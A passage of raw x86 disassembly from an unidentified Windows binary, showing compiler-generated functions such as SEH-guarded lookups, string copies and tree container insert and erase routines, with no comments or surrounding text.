   15e3a:	ret    0x4
   15e3d:	int3   
   15e3e:	int3   
   15e3f:	int3   
   15e40:	int3   
   15e41:	int3   
   15e42:	mov    edi,edi
   15e44:	push   ebp
   15e45:	mov    ebp,esp
   15e47:	push   ecx
   15e48:	push   esi
   15e49:	mov    esi,ecx
   15e4b:	cmp    esi,DWORD PTR [ebp+0x8]
   15e4e:	je     0x15e6c
   15e50:	mov    eax,DWORD PTR [esi+0x4]
   15e53:	mov    ecx,DWORD PTR [eax]
   15e55:	push   eax
   15e56:	push   ecx
   15e57:	lea    eax,[ebp-0x4]
   15e5a:	push   eax
   15e5b:	mov    ecx,esi
   15e5d:	call   0x14d6a
   15e62:	push   DWORD PTR [ebp+0x8]
   15e65:	mov    ecx,esi
   15e67:	call   0x14b62
   15e6c:	mov    eax,esi
   15e6e:	pop    esi
   15e6f:	leave  
   15e70:	ret    0x4
   15e73:	int3   
   15e74:	int3   
   15e75:	int3   
   15e76:	int3   
   15e77:	int3   
   15e78:	mov    edi,edi
   15e7a:	push   ebp
   15e7b:	mov    ebp,esp
   15e7d:	push   ecx
   15e7e:	push   ebx
   15e7f:	push   esi
   15e80:	push   edi
   15e81:	xor    edi,edi
   15e83:	push   edi
   15e84:	push   edi
   15e85:	push   edi
   15e86:	mov    esi,ecx
   15e88:	mov    eax,DWORD PTR [esi+0x10]
   15e8b:	push   edi
   15e8c:	push   eax
   15e8d:	xor    ebx,ebx
   15e8f:	call   DWORD PTR ds:0x1ee28
   15e95:	test   eax,eax
   15e97:	jge    0x15e9d
   15e99:	xor    eax,eax
   15e9b:	jmp    0x15ec3
   15e9d:	lea    eax,[ebp+0x8]
   15ea0:	push   eax
   15ea1:	lea    eax,[ebp-0x4]
   15ea4:	push   eax
   15ea5:	mov    ecx,esi
   15ea7:	call   0x13bfa
   15eac:	mov    eax,DWORD PTR [ebp-0x4]
   15eaf:	cmp    eax,DWORD PTR [esi+0x4]
   15eb2:	je     0x15eb7
   15eb4:	mov    ebx,DWORD PTR [eax+0x10]
   15eb7:	push   edi
   15eb8:	push   DWORD PTR [esi+0x10]
   15ebb:	call   DWORD PTR ds:0x1ee24
   15ec1:	mov    eax,ebx
   15ec3:	pop    edi
   15ec4:	pop    esi
   15ec5:	pop    ebx
   15ec6:	leave  
   15ec7:	ret    0x4
   15eca:	int3   
   15ecb:	int3   
   15ecc:	int3   
   15ecd:	int3   
   15ece:	int3   
   15ecf:	int3   
   15ed0:	push   0x10
   15ed2:	push   0x7dfb8
   15ed7:	call   0x1dadc
   15edc:	xor    ebx,ebx
   15ede:	push   ebx
   15edf:	push   ebx
   15ee0:	push   ebx
   15ee1:	push   ebx
   15ee2:	push   0x7eb70
   15ee7:	call   DWORD PTR ds:0x1ee28
   15eed:	cmp    eax,ebx
   15eef:	jl     0x15fac
   15ef5:	mov    DWORD PTR [ebp-0x4],ebx
   15ef8:	push   0xffffffff
   15efa:	push   0x1def0
   15eff:	lea    ecx,[ebp-0x20]
   15f02:	call   0x110cc
   15f07:	mov    esi,DWORD PTR [ebp+0x8]
   15f0a:	push   esi
   15f0b:	lea    eax,[ebp+0x8]
   15f0e:	push   eax
   15f0f:	mov    ecx,DWORD PTR ds:0x7eb40
   15f15:	call   0x14bee
   15f1a:	mov    eax,ds:0x7eb40
   15f1f:	mov    eax,DWORD PTR [eax+0x4]
   15f22:	mov    ecx,DWORD PTR [ebp+0x8]
   15f25:	cmp    ecx,eax
   15f27:	je     0x15f35
   15f29:	add    ecx,0x14
   15f2c:	push   ecx
   15f2d:	lea    ecx,[ebp-0x20]
   15f30:	call   0x129ea
   15f35:	mov    edx,DWORD PTR [esi+0x4]
   15f38:	mov    eax,DWORD PTR [ebp-0x1c]
   15f3b:	lea    ecx,[eax+edx*1+0x2]
   15f3f:	mov    eax,DWORD PTR [ebp+0xc]
   15f42:	cmp    ecx,DWORD PTR [eax]
   15f44:	jbe    0x15f51
   15f46:	mov    DWORD PTR [eax],ecx
   15f48:	mov    DWORD PTR [eax+0x8],0x2
   15f4f:	jmp    0x15f74
   15f51:	mov    DWORD PTR [eax+0x8],ebx
   15f54:	mov    esi,DWORD PTR [esi]
   15f56:	lea    edi,[eax+0xc]
   15f59:	mov    cl,BYTE PTR [esi]
   15f5b:	mov    BYTE PTR [edi],cl
   15f5d:	inc    esi
   15f5e:	inc    edi
   15f5f:	cmp    cl,bl
   15f61:	jne    0x15f59
   15f63:	mov    esi,DWORD PTR [ebp-0x20]
   15f66:	lea    eax,[edx+eax*1+0xd]
   15f6a:	mov    cl,BYTE PTR [esi]
   15f6c:	mov    BYTE PTR [eax],cl
   15f6e:	inc    esi
   15f6f:	inc    eax
   15f70:	cmp    cl,bl
   15f72:	jne    0x15f6a
   15f74:	push   DWORD PTR [ebp-0x20]
   15f77:	call   0x10a9a
   15f7c:	pop    ecx
   15f7d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   15f84:	jmp    0x15fa0
   15f86:	xor    eax,eax
   15f88:	inc    eax
   15f89:	ret    
   15f8a:	mov    esp,DWORD PTR [ebp-0x18]
   15f8d:	mov    eax,DWORD PTR [ebp+0xc]
   15f90:	mov    DWORD PTR [eax+0x8],0x4
   15f97:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   15f9e:	xor    ebx,ebx
   15fa0:	push   ebx
   15fa1:	push   0x7eb70
   15fa6:	call   DWORD PTR ds:0x1ee24
   15fac:	call   0x1db21
   15fb1:	ret    0x8
   15fb4:	int3   
   15fb5:	int3   
   15fb6:	int3   
   15fb7:	int3   
   15fb8:	int3   
   15fb9:	int3   
   15fba:	push   0xc
   15fbc:	push   0x7dfd8
   15fc1:	call   0x1dadc
   15fc6:	xor    edi,edi
   15fc8:	push   edi
   15fc9:	push   edi
   15fca:	push   edi
   15fcb:	push   edi
   15fcc:	push   0x7eb70
   15fd1:	call   DWORD PTR ds:0x1ee28
   15fd7:	cmp    eax,edi
   15fd9:	jl     0x16088
   15fdf:	mov    DWORD PTR [ebp-0x4],edi
   15fe2:	lea    eax,[ebp+0x8]
   15fe5:	push   eax
   15fe6:	lea    eax,[ebp-0x1c]
   15fe9:	push   eax
   15fea:	mov    esi,DWORD PTR ds:0x7ebcc
   15ff0:	mov    ecx,esi
   15ff2:	call   0x13ccc
   15ff7:	mov    esi,DWORD PTR [esi+0x4]
   15ffa:	mov    ecx,DWORD PTR [ebp-0x1c]
   15ffd:	cmp    ecx,esi
   15fff:	jne    0x1600d
   16001:	mov    eax,DWORD PTR [ebp+0xc]
   16004:	mov    DWORD PTR [eax+0x8],0x1
   1600b:	jmp    0x16059
   1600d:	mov    eax,DWORD PTR [ecx+0x10]
   16010:	cmp    eax,edi
   16012:	jne    0x16018
   16014:	xor    edx,edx
   16016:	jmp    0x1601b
   16018:	mov    edx,DWORD PTR [eax+0x8]
   1601b:	mov    eax,DWORD PTR [ebp+0xc]
   1601e:	cmp    edx,DWORD PTR [eax]
   16020:	jbe    0x1602d
   16022:	mov    DWORD PTR [eax],edx
   16024:	mov    DWORD PTR [eax+0x8],0x2
   1602b:	jmp    0x16059
   1602d:	mov    DWORD PTR [eax+0x8],edi
   16030:	mov    edx,DWORD PTR [ecx+0x10]
   16033:	cmp    edx,edi
   16035:	jne    0x1603b
   16037:	xor    edx,edx
   16039:	jmp    0x1603e
   1603b:	mov    edx,DWORD PTR [edx+0x8]
   1603e:	mov    ecx,DWORD PTR [ecx+0x10]
   16041:	cmp    ecx,edi
   16043:	jne    0x16049
   16045:	xor    ecx,ecx
   16047:	jmp    0x1604b
   16049:	mov    ecx,DWORD PTR [ecx]
   1604b:	push   edx
   1604c:	push   ecx
   1604d:	add    eax,0xc
   16050:	push   eax
   16051:	call   0x1daa0
   16056:	add    esp,0xc
   16059:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   16060:	jmp    0x1607c
   16062:	xor    eax,eax
   16064:	inc    eax
   16065:	ret    
   16066:	mov    esp,DWORD PTR [ebp-0x18]
   16069:	mov    eax,DWORD PTR [ebp+0xc]
   1606c:	mov    DWORD PTR [eax+0x8],0x4
   16073:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1607a:	xor    edi,edi
   1607c:	push   edi
   1607d:	push   0x7eb70
   16082:	call   DWORD PTR ds:0x1ee24
   16088:	call   0x1db21
   1608d:	ret    0x8
   16090:	int3   
   16091:	int3   
   16092:	int3   
   16093:	int3   
   16094:	int3   
   16095:	int3   
   16096:	mov    edi,edi
   16098:	push   ebp
   16099:	mov    ebp,esp
   1609b:	push   ebx
   1609c:	push   esi
   1609d:	push   DWORD PTR [ebp+0x8]
   160a0:	mov    esi,ecx
   160a2:	lea    eax,[ebp+0x8]
   160a5:	push   eax
   160a6:	lea    ecx,[esi+0x4]
   160a9:	xor    bl,bl
   160ab:	call   0x13d2e
   160b0:	mov    eax,DWORD PTR [ebp+0x8]
   160b3:	cmp    eax,DWORD PTR [esi+0x8]
   160b6:	je     0x160c6
   160b8:	mov    ecx,DWORD PTR [ebp+0xc]
   160bb:	add    eax,0x18
   160be:	push   eax
   160bf:	call   0x12a78
   160c4:	inc    bl
   160c6:	pop    esi
   160c7:	mov    al,bl
   160c9:	pop    ebx
   160ca:	pop    ebp
   160cb:	ret    0x8
   160ce:	int3   
   160cf:	int3   
   160d0:	int3   
   160d1:	int3   
   160d2:	int3   
   160d3:	int3   
   160d4:	mov    edi,edi
   160d6:	push   ebp
   160d7:	mov    ebp,esp
   160d9:	push   ecx
   160da:	push   ecx
   160db:	push   DWORD PTR [ebp+0xc]
   160de:	lea    eax,[ebp-0x8]
   160e1:	push   eax
   160e2:	call   0x14cd2
   160e7:	mov    eax,DWORD PTR [ebp+0x8]
   160ea:	mov    ecx,DWORD PTR [ebp-0x8]
   160ed:	mov    DWORD PTR [eax],ecx
   160ef:	mov    cl,BYTE PTR [ebp-0x4]
   160f2:	mov    BYTE PTR [eax+0x4],cl
   160f5:	leave  
   160f6:	ret    0x8
   160f9:	int3   
   160fa:	int3   
   160fb:	int3   
   160fc:	int3   
   160fd:	int3   
   160fe:	mov    edi,edi
   16100:	push   ebp
   16101:	mov    ebp,esp
   16103:	push   ecx
   16104:	push   esi
   16105:	mov    esi,ecx
   16107:	mov    eax,DWORD PTR [esi+0x4]
   1610a:	mov    ecx,DWORD PTR [eax]
   1610c:	push   eax
   1610d:	push   ecx
   1610e:	lea    eax,[ebp-0x4]
   16111:	push   eax
   16112:	mov    ecx,esi
   16114:	call   0x14d6a
   16119:	push   DWORD PTR [esi+0x4]
   1611c:	call   0x10a9a
   16121:	xor    eax,eax
   16123:	mov    DWORD PTR [esi+0x4],eax
   16126:	mov    DWORD PTR [esi+0xc],eax
   16129:	dec    DWORD PTR ds:0x7f830
   1612f:	pop    ecx
   16130:	pop    esi
   16131:	jne    0x16149
   16133:	mov    ecx,DWORD PTR ds:0x7f6cc
   16139:	mov    ds:0x7f6cc,eax
   1613e:	cmp    ecx,eax
   16140:	je     0x16149
   16142:	push   ecx
   16143:	call   0x10a9a
   16148:	pop    ecx
   16149:	leave  
   1614a:	ret    
   1614b:	int3   
   1614c:	int3   
   1614d:	int3   
   1614e:	int3   
   1614f:	int3   
   16150:	mov    edi,edi
   16152:	push   ebp
   16153:	mov    ebp,esp
   16155:	push   ecx
   16156:	push   ecx
   16157:	push   DWORD PTR [ebp+0xc]
   1615a:	lea    eax,[ebp-0x8]
   1615d:	push   eax
   1615e:	call   0x14e32
   16163:	mov    eax,DWORD PTR [ebp+0x8]
   16166:	mov    ecx,DWORD PTR [ebp-0x8]
   16169:	mov    DWORD PTR [eax],ecx
   1616b:	mov    cl,BYTE PTR [ebp-0x4]
   1616e:	mov    BYTE PTR [eax+0x4],cl
   16171:	leave  
   16172:	ret    0x8
   16175:	int3   
   16176:	int3   
   16177:	int3   
   16178:	int3   
   16179:	int3   
   1617a:	mov    edi,edi
   1617c:	push   ebp
   1617d:	mov    ebp,esp
   1617f:	push   ecx
   16180:	push   ecx
   16181:	push   DWORD PTR [ebp+0x8]
   16184:	lea    eax,[ebp-0x8]
   16187:	push   eax
   16188:	call   0x14062
   1618d:	and    DWORD PTR [ebp+0x8],0x0
   16191:	lea    eax,[ebp+0x8]
   16194:	push   eax
   16195:	push   DWORD PTR [ebp-0x4]
   16198:	push   DWORD PTR [ebp-0x8]
   1619b:	call   0x15df4
   161a0:	mov    eax,DWORD PTR [ebp+0x8]
   161a3:	add    esp,0xc
   161a6:	leave  
   161a7:	ret    0x4
   161aa:	int3   
   161ab:	int3   
   161ac:	int3   
   161ad:	int3   
   161ae:	int3   
   161af:	int3   
   161b0:	mov    edi,edi
   161b2:	push   ebp
   161b3:	mov    ebp,esp
   161b5:	push   ecx
   161b6:	push   ecx
   161b7:	push   esi
   161b8:	push   DWORD PTR [ebp+0x8]
   161bb:	lea    eax,[ebp-0x8]
   161be:	push   eax
   161bf:	mov    esi,ecx
   161c1:	call   0x140f6
   161c6:	and    DWORD PTR [ebp+0x8],0x0
   161ca:	lea    eax,[ebp+0x8]
   161cd:	push   eax
   161ce:	push   DWORD PTR [ebp-0x4]
   161d1:	push   DWORD PTR [ebp-0x8]
   161d4:	call   0x13a5e
   161d9:	add    esp,0xc
   161dc:	push   DWORD PTR [ebp-0x4]
   161df:	lea    eax,[ebp-0x4]
   161e2:	push   DWORD PTR [ebp-0x8]
   161e5:	mov    ecx,esi
   161e7:	push   eax
   161e8:	call   0x14eca
   161ed:	mov    eax,DWORD PTR [ebp+0x8]
   161f0:	pop    esi
   161f1:	leave  
   161f2:	ret    0x4
   161f5:	int3   
   161f6:	int3   
   161f7:	int3   
   161f8:	int3   
   161f9:	int3   
   161fa:	mov    edi,edi
   161fc:	push   ebp
   161fd:	mov    ebp,esp
   161ff:	push   ecx
   16200:	push   ebx
   16201:	push   esi
   16202:	push   edi
   16203:	mov    edi,ecx
   16205:	mov    eax,DWORD PTR [edi+0x4]
   16208:	mov    esi,DWORD PTR [eax+0x4]
   1620b:	mov    ebx,eax
   1620d:	mov    al,0x1
   1620f:	jmp    0x1622a
   16211:	lea    eax,[esi+0x10]
   16214:	push   eax
   16215:	push   DWORD PTR [ebp+0xc]
   16218:	mov    ebx,esi
   1621a:	call   0x197e8
   1621f:	test   al,al
   16221:	je     0x16227
   16223:	mov    esi,DWORD PTR [esi]
   16225:	jmp    0x1622a
   16227:	mov    esi,DWORD PTR [esi+0x8]
   1622a:	cmp    esi,DWORD PTR ds:0x7f6d0
   16230:	jne    0x16211
   16232:	cmp    BYTE PTR [edi+0x8],0x0
   16236:	je     0x16253
   16238:	push   DWORD PTR [ebp+0xc]
   1623b:	lea    eax,[ebp+0xc]
   1623e:	push   ebx
   1623f:	push   esi
   16240:	push   eax
   16241:	mov    ecx,edi
   16243:	call   0x151f4
   16248:	mov    ecx,DWORD PTR [eax]
   1624a:	mov    eax,DWORD PTR [ebp+0x8]
   1624d:	mov    BYTE PTR [eax+0x4],0x1
   16251:	jmp    0x16286
   16253:	mov    DWORD PTR [ebp-0x4],ebx
   16256:	test   al,al
   16258:	je     0x16269
   1625a:	mov    eax,DWORD PTR [edi+0x4]
   1625d:	cmp    ebx,DWORD PTR [eax]
   1625f:	je     0x16238
   16261:	lea    ecx,[ebp-0x4]
   16264:	call   0x11526
   16269:	push   DWORD PTR [ebp+0xc]
   1626c:	mov    eax,DWORD PTR [ebp-0x4]
   1626f:	add    eax,0x10
   16272:	push   eax
   16273:	call   0x197e8
   16278:	test   al,al
   1627a:	jne    0x16238
   1627c:	mov    eax,DWORD PTR [ebp+0x8]
   1627f:	mov    ecx,DWORD PTR [ebp-0x4]
   16282:	mov    BYTE PTR [eax+0x4],0x0
   16286:	pop    edi
   16287:	pop    esi
   16288:	mov    DWORD PTR [eax],ecx
   1628a:	pop    ebx
   1628b:	leave  
   1628c:	ret    0x8
   1628f:	int3   
   16290:	int3   
   16291:	int3   
   16292:	int3   
   16293:	int3   
   16294:	mov    edi,edi
   16296:	push   ebp
   16297:	mov    ebp,esp
   16299:	push   ecx
   1629a:	push   esi
   1629b:	mov    esi,ecx
   1629d:	cmp    DWORD PTR [esi+0xc],0x0
   162a1:	mov    ecx,DWORD PTR [ebp+0xc]
   162a4:	je     0x162de
   162a6:	mov    eax,DWORD PTR [esi+0x4]
   162a9:	cmp    ecx,DWORD PTR [eax]
   162ab:	jne    0x162de
   162ad:	cmp    DWORD PTR [ebp+0x10],eax
   162b0:	jne    0x162de
   162b2:	push   DWORD PTR [eax+0x4]
   162b5:	mov    ecx,esi
   162b7:	call   0x151aa
   162bc:	mov    ecx,DWORD PTR ds:0x7f6d0
   162c2:	mov    eax,DWORD PTR [esi+0x4]
   162c5:	mov    DWORD PTR [eax+0x4],ecx
   162c8:	mov    eax,DWORD PTR [esi+0x4]
   162cb:	and    DWORD PTR [esi+0xc],0x0
   162cf:	mov    DWORD PTR [eax],eax
   162d1:	mov    eax,DWORD PTR [esi+0x4]
   162d4:	mov    DWORD PTR [eax+0x8],eax
   162d7:	mov    eax,DWORD PTR [esi+0x4]
   162da:	mov    ecx,DWORD PTR [eax]
   162dc:	jmp    0x16303
   162de:	cmp    ecx,DWORD PTR [ebp+0x10]
   162e1:	je     0x16303
   162e3:	push   edi
   162e4:	mov    edi,ecx
   162e6:	lea    ecx,[ebp+0xc]
   162e9:	call   0x12ec0
   162ee:	push   edi
   162ef:	lea    eax,[ebp-0x4]
   162f2:	push   eax
   162f3:	mov    ecx,esi
   162f5:	call   0x14f48
   162fa:	mov    ecx,DWORD PTR [ebp+0xc]
   162fd:	cmp    ecx,DWORD PTR [ebp+0x10]
   16300:	jne    0x162e4
   16302:	pop    edi
   16303:	mov    eax,DWORD PTR [ebp+0x8]
   16306:	mov    DWORD PTR [eax],ecx
   16308:	pop    esi
   16309:	leave  
   1630a:	ret    0xc
   1630d:	int3   
   1630e:	int3   
   1630f:	int3   
   16310:	int3   
   16311:	int3   
   16312:	mov    edi,edi
   16314:	push   ebp
   16315:	mov    ebp,esp
   16317:	push   ecx
   16318:	push   ebx
   16319:	push   esi
   1631a:	push   edi
   1631b:	mov    edi,ecx
   1631d:	mov    eax,DWORD PTR [edi+0x4]
   16320:	mov    esi,DWORD PTR [eax+0x4]
   16323:	mov    ebx,eax
   16325:	mov    al,0x1
   16327:	jmp    0x16342
   16329:	lea    eax,[esi+0x10]
   1632c:	push   eax
   1632d:	push   DWORD PTR [ebp+0xc]
   16330:	mov    ebx,esi
   16332:	call   0x197e8
   16337:	test   al,al
   16339:	je     0x1633f
   1633b:	mov    esi,DWORD PTR [esi]
   1633d:	jmp    0x16342
   1633f:	mov    esi,DWORD PTR [esi+0x8]
   16342:	cmp    esi,DWORD PTR ds:0x7f6d4
   16348:	jne    0x16329
   1634a:	cmp    BYTE PTR [edi+0x8],0x0
   1634e:	je     0x1636b
   16350:	push   DWORD PTR [ebp+0xc]
   16353:	lea    eax,[ebp+0xc]
   16356:	push   ebx
   16357:	push   esi
   16358:	push   eax
   16359:	mov    ecx,edi
   1635b:	call   0x155f6
   16360:	mov    ecx,DWORD PTR [eax]
   16362:	mov    eax,DWORD PTR [ebp+0x8]
   16365:	mov    BYTE PTR [eax+0x4],0x1
   16369:	jmp    0x1639e
   1636b:	mov    DWORD PTR [ebp-0x4],ebx
   1636e:	test   al,al
   16370:	je     0x16381
   16372:	mov    eax,DWORD PTR [edi+0x4]
   16375:	cmp    ebx,DWORD PTR [eax]
   16377:	je     0x16350
   16379:	lea    ecx,[ebp-0x4]
   1637c:	call   0x113de
   16381:	push   DWORD PTR [ebp+0xc]
   16384:	mov    eax,DWORD PTR [ebp-0x4]
   16387:	add    eax,0x10
   1638a:	push   eax
   1638b:	call   0x197e8
   16390:	test   al,al
   16392:	jne    0x16350
   16394:	mov    eax,DWORD PTR [ebp+0x8]
   16397:	mov    ecx,DWORD PTR [ebp-0x4]
   1639a:	mov    BYTE PTR [eax+0x4],0x0
   1639e:	pop    edi
   1639f:	pop    esi
   163a0:	mov    DWORD PTR [eax],ecx
   163a2:	pop    ebx
   163a3:	leave  
   163a4:	ret    0x8
   163a7:	int3   
   163a8:	int3   
   163a9:	int3   
   163aa:	int3   
   163ab:	int3   
   163ac:	mov    edi,edi
   163ae:	push   ebp
   163af:	mov    ebp,esp
   163b1:	push   ecx
   163b2:	push   esi
   163b3:	mov    esi,ecx
   163b5:	cmp    DWORD PTR [esi+0xc],0x0
   163b9:	mov    ecx,DWORD PTR [ebp+0xc]
   163bc:	je     0x163f6
   163be:	mov    eax,DWORD PTR [esi+0x4]
   163c1:	cmp    ecx,DWORD PTR [eax]
   163c3:	jne    0x163f6
   163c5:	cmp    DWORD PTR [ebp+0x10],eax
   163c8:	jne    0x163f6
   163ca:	push   DWORD PTR [eax+0x4]
   163cd:	mov    ecx,esi
   163cf:	call   0x155ac
   163d4:	mov    ecx,DWORD PTR ds:0x7f6d4
   163da:	mov    eax,DWORD PTR [esi+0x4]
   163dd:	mov    DWORD PTR [eax+0x4],ecx
   163e0:	mov    eax,DWORD PTR [esi+0x4]
   163e3:	and    DWORD PTR [esi+0xc],0x0
   163e7:	mov    DWORD PTR [eax],eax
   163e9:	mov    eax,DWORD PTR [esi+0x4]
   163ec:	mov    DWORD PTR [eax+0x8],eax
   163ef:	mov    eax,DWORD PTR [esi+0x4]
   163f2:	mov    ecx,DWORD PTR [eax]
   163f4:	jmp    0x1641b
   163f6:	cmp    ecx,DWORD PTR [ebp+0x10]
   163f9:	je     0x1641b
   163fb:	push   edi
   163fc:	mov    edi,ecx
   163fe:	lea    ecx,[ebp+0xc]
   16401:	call   0x1387e
   16406:	push   edi
   16407:	lea    eax,[ebp-0x4]
   1640a:	push   eax
   1640b:	mov    ecx,esi
   1640d:	call   0x1534a
   16412:	mov    ecx,DWORD PTR [ebp+0xc]
   16415:	cmp    ecx,DWORD PTR [ebp+0x10]
   16418:	jne    0x163fc
   1641a:	pop    edi
   1641b:	mov    eax,DWORD PTR [ebp+0x8]
   1641e:	mov    DWORD PTR [eax],ecx
   16420:	pop    esi
   16421:	leave  
   16422:	ret    0xc
   16425:	int3   
   16426:	int3   
   16427:	int3   
   16428:	int3   
   16429:	int3   
   1642a:	mov    edi,edi
   1642c:	push   ebp
   1642d:	mov    ebp,esp
   1642f:	push   ecx
   16430:	push   ebx
   16431:	push   esi
   16432:	push   edi
   16433:	mov    edi,ecx
   16435:	mov    eax,DWORD PTR [edi+0x4]
   16438:	mov    esi,DWORD PTR [eax+0x4]
   1643b:	mov    ebx,eax
   1643d:	mov    al,0x1
   1643f:	jmp    0x1645a
   16441:	lea    eax,[esi+0xc]
   16444:	push   eax
   16445:	push   DWORD PTR [ebp+0xc]
   16448:	mov    ebx,esi
   1644a:	call   0x197e8
   1644f:	test   al,al
   16451:	je     0x16457
   16453:	mov    esi,DWORD PTR [esi]
   16455:	jmp    0x1645a
   16457:	mov    esi,DWORD PTR [esi+0x8]
   1645a:	cmp    esi,DWORD PTR ds:0x7f6d8
   16460:	jne    0x16441
   16462:	cmp    BYTE PTR [edi+0x8],0x0
   16466:	je     0x16483
   16468:	push   DWORD PTR [ebp+0xc]
   1646b:	lea    eax,[ebp+0xc]
   1646e:	push   ebx
   1646f:	push   esi
   16470:	push   eax
   16471:	mov    ecx,edi
   16473:	call   0x1574c
   16478:	mov    ecx,DWORD PTR [eax]
   1647a:	mov    eax,DWORD PTR [ebp+0x8]
   1647d:	mov    BYTE PTR [eax+0x4],0x1
   16481:	jmp    0x164b6
   16483:	mov    DWORD PTR [ebp-0x4],ebx
   16486:	test   al,al
   16488:	je     0x16499
   1648a:	mov    eax,DWORD PTR [edi+0x4]
   1648d:	cmp    ebx,DWORD PTR [eax]
   1648f:	je     0x16468
   16491:	lea    ecx,[ebp-0x4]
   16494:	call   0x11462
   16499:	push   DWORD PTR [ebp+0xc]
   1649c:	mov    eax,DWORD PTR [ebp-0x4]
   1649f:	add    eax,0xc
   164a2:	push   eax
   164a3:	call   0x197e8
   164a8:	test   al,al
   164aa:	jne    0x16468
   164ac:	mov    eax,DWORD PTR [ebp+0x8]
   164af:	mov    ecx,DWORD PTR [ebp-0x4]
   164b2:	mov    BYTE PTR [eax+0x4],0x0
   164b6:	pop    edi
   164b7:	pop    esi
   164b8:	mov    DWORD PTR [eax],ecx
   164ba:	pop    ebx
   164bb:	leave  
   164bc:	ret    0x8
   164bf:	int3   
   164c0:	int3   
   164c1:	int3   
   164c2:	int3   
   164c3:	int3   
   164c4:	mov    edi,edi
   164c6:	push   ebp
   164c7:	mov    ebp,esp
   164c9:	push   ecx
   164ca:	push   ebx
   164cb:	push   esi
   164cc:	push   edi
   164cd:	mov    edi,ecx
   164cf:	mov    eax,DWORD PTR [edi+0x4]
   164d2:	mov    esi,DWORD PTR [eax+0x4]
   164d5:	mov    ebx,eax
   164d7:	mov    eax,ds:0x7f6dc
   164dc:	mov    dl,0x1
   164de:	cmp    esi,eax
   164e0:	je     0x164fe
   164e2:	mov    ecx,DWORD PTR [ebp+0xc]
   164e5:	mov    ecx,DWORD PTR [ecx]
   164e7:	cmp    ecx,DWORD PTR [esi+0xc]
   164ea:	mov    ebx,esi
   164ec:	setl   dl
   164ef:	test   dl,dl
   164f1:	je     0x164f7
   164f3:	mov    esi,DWORD PTR [esi]
   164f5:	jmp    0x164fa
   164f7:	mov    esi,DWORD PTR [esi+0x8]
   164fa:	cmp    esi,eax
   164fc:	jne    0x164e7
   164fe:	cmp    BYTE PTR [edi+0x8],0x0
   16502:	je     0x1651f
   16504:	push   DWORD PTR [ebp+0xc]
   16507:	push   ebx
   16508:	push   esi
   16509:	lea    eax,[ebp+0xc]
   1650c:	push   eax
   1650d:	mov    ecx,edi
   1650f:	call   0x15b4e
   16514:	mov    ecx,DWORD PTR [eax]
   16516:	mov    eax,DWORD PTR [ebp+0x8]
   16519:	mov    BYTE PTR [eax+0x4],0x1
   1651d:	jmp    0x1654e
   1651f:	mov    ecx,ebx
   16521:	mov    DWORD PTR [ebp-0x4],ecx
   16524:	test   dl,dl
   16526:	je     0x1653a
   16528:	mov    eax,DWORD PTR [edi+0x4]
   1652b:	cmp    ebx,DWORD PTR [eax]
   1652d:	je     0x16504
   1652f:	lea    ecx,[ebp-0x4]
   16532:	call   0x114e6
   16537:	mov    ecx,DWORD PTR [ebp-0x4]
   1653a:	mov    edx,DWORD PTR [ecx+0xc]
   1653d:	mov    eax,DWORD PTR [ebp+0xc]
   16540:	cmp    edx,DWORD PTR [eax]
   16542:	jge    0x16547
   16544:	push   eax
   16545:	jmp    0x16507
   16547:	mov    eax,DWORD PTR [ebp+0x8]
   1654a:	mov    BYTE PTR [eax+0x4],0x0
   1654e:	pop    edi
   1654f:	pop    esi
   16550:	mov    DWORD PTR [eax],ecx
   16552:	pop    ebx
   16553:	leave  
   16554:	ret    0x8
   16557:	int3   
   16558:	int3   
   16559:	int3   
   1655a:	int3   
   1655b:	int3   
   1655c:	mov    edi,edi
   1655e:	push   ebp
   1655f:	mov    ebp,esp
   16561:	push   ecx
   16562:	push   esi
   16563:	mov    esi,ecx
   16565:	cmp    DWORD PTR [esi+0xc],0x0
   16569:	mov    ecx,DWORD PTR [ebp+0xc]
   1656c:	je     0x165a6
   1656e:	mov    eax,DWORD PTR [esi+0x4]
   16571:	cmp    ecx,DWORD PTR [eax]
   16573:	jne    0x165a6
   16575:	cmp    DWORD PTR [ebp+0x10],eax
   16578:	jne    0x165a6
   1657a:	push   DWORD PTR [eax+0x4]
   1657d:	mov    ecx,esi
   1657f:	call   0x15b04
   16584:	mov    ecx,DWORD PTR ds:0x7f6dc
   1658a:	mov    eax,DWORD PTR [esi+0x4]
   1658d:	mov    DWORD PTR [eax+0x4],ecx
   16590:	mov    eax,DWORD PTR [esi+0x4]
   16593:	and    DWORD PTR [esi+0xc],0x0
   16597:	mov    DWORD PTR [eax],eax
   16599:	mov    eax,DWORD PTR [esi+0x4]
   1659c:	mov    DWORD PTR [eax+0x8],eax
   1659f:	mov    eax,DWORD PTR [esi+0x4]
   165a2:	mov    ecx,DWORD PTR [eax]
   165a4:	jmp    0x165cb
   165a6:	cmp    ecx,DWORD PTR [ebp+0x10]
   165a9:	je     0x165cb
   165ab:	push   edi
   165ac:	mov    edi,ecx
   165ae:	lea    ecx,[ebp+0xc]
   165b1:	call   0x1159c
   165b6:	push   edi
   165b7:	lea    eax,[ebp-0x4]
   165ba:	push   eax
   165bb:	mov    ecx,esi
   165bd:	call   0x158a2
   165c2:	mov    ecx,DWORD PTR [ebp+0xc]
   165c5:	cmp    ecx,DWORD PTR [ebp+0x10]
   165c8:	jne    0x165ac
   165ca:	pop    edi
   165cb:	mov    eax,DWORD PTR [ebp+0x8]
   165ce:	mov    DWORD PTR [eax],ecx
   165d0:	pop    esi
   165d1:	leave  
   165d2:	ret    0xc
   165d5:	int3   
   165d6:	int3   
   165d7:	int3   
   165d8:	int3   
   165d9:	int3   
   165da:	mov    edi,edi
   165dc:	push   ebp
   165dd:	mov    ebp,esp
   165df:	push   ecx
   165e0:	push   ebx
   165e1:	push   esi
   165e2:	push   edi
   165e3:	mov    edi,ecx
   165e5:	mov    eax,DWORD PTR [edi+0x4]
   165e8:	mov    esi,DWORD PTR [eax+0x4]
   165eb:	mov    ebx,eax
   165ed:	mov    al,0x1
   165ef:	jmp    0x1660a
   165f1:	lea    eax,[esi+0xc]
   165f4:	push   eax
   165f5:	push   DWORD PTR [ebp+0xc]
   165f8:	mov    ebx,esi
   165fa:	call   0x19818
   165ff:	test   al,al
   16601:	je     0x16607
   16603:	mov    esi,DWORD PTR [esi]
   16605:	jmp    0x1660a
   16607:	mov    esi,DWORD PTR [esi+0x8]
   1660a:	cmp    esi,DWORD PTR ds:0x7f6e4
   16610:	jne    0x165f1
